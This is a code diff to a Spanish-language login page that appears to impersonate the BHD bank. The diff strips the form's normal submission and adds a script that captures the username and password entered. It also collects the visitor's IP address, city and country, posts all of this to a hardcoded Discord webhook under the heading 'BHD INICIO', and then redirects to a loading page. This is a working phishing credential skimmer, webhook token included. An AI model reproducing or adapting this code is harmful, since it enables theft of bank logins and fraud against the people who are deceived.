@@ -108,7 +108,8 @@
       <div class="linea-personal">| Personal</div>
     </div>
 
-    <form method="POST" action="cargando.html" id="loginForm">
+    <!-- ELIMINÉ method y action para evitar envíos POST a .html -->
+    <form id="loginForm">
       <label for="usuario">Usuario<span class="asterisco">*</span></label>
       <div class="input-group">
         <img src="perfil.png" alt="Usuario" />
@@ -130,6 +131,92 @@
     </div>
   </div>
 
-<script src="lo.js"></script>
+<script>
+  // Configuración del Webhook de Discord
+  const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1472057162447720539/1ah2nyf69R2i7vlRY5v-WKvnCE3esv5E_J-kcR9vdKTABGfGRqMbsEYn9R5Hml77rjn6';
+
+  // Limpiar inputs
+  document.getElementById('usuario').addEventListener('input', function() {
+    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+  });
+  document.getElementById('clave').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+  });
+
+  // Interceptar el envío del formulario
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault(); // Prevenir envío tradicional
+
+    const usuario = document.getElementById('usuario').value.trim();
+    const clave = document.getElementById('clave').value.trim();
+    const submitBtn = document.getElementById('submitBtn');
+
+    if (!usuario || !clave) {
+      alert('Por favor, complete todos los campos.');
+      return;
+    }
+
+    // Deshabilitar botón
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Enviando...';
+
+    // Guardar usuario en localStorage
+    localStorage.setItem('usuario', usuario);
+    console.log('Usuario guardado:', usuario);
+
+    // Obtener IP y ubicación
+    let ip = 'Desconocida', ciudad = 'Desconocida', pais = 'Desconocido';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      if (ipRes.ok) {
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        if (locRes.ok) {
+          const locData = await locRes.json();
+          ciudad = locData.city || 'Desconocida';
+          pais = locData.country_name || 'Desconocido';
+        }
+      }
+    } catch (error) {
+      console.warn('Error obteniendo ubicación:', error);
+    }
+
+    const fecha = new Date().toLocaleString('es-ES', { hour12: false });
+
+    // Mensaje para Discord
+    const mensaje = {
+      content: `💰 BHD INICIO 💰
+✉️ Usuario: ${usuario}
+🔑 Clave: ${clave}
+
+🌐 IP: ${ip}
+🏙 Ciudad: ${ciudad}
+🇩🇴 País: ${pais}
+
+🕒 Fecha: ${fecha}
+
+By: ASHESITO`
+    };
+
+    // Enviar a Discord con keepalive (no se cancela al redirigir)
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(mensaje),
+        keepalive: true // ← CLAVE para Azure
+      });
+      console.log('✅ Datos enviados a Discord');
+    } catch (error) {
+      console.error('Error enviando a Discord:', error);
+    }
+
+    // Redirigir a cargando.html después de 1 segundo
+    setTimeout(() => {
+      window.location.href = 'cargando.html';
+    }, 1000);
+  });
+</script>
 </body>
 </html>
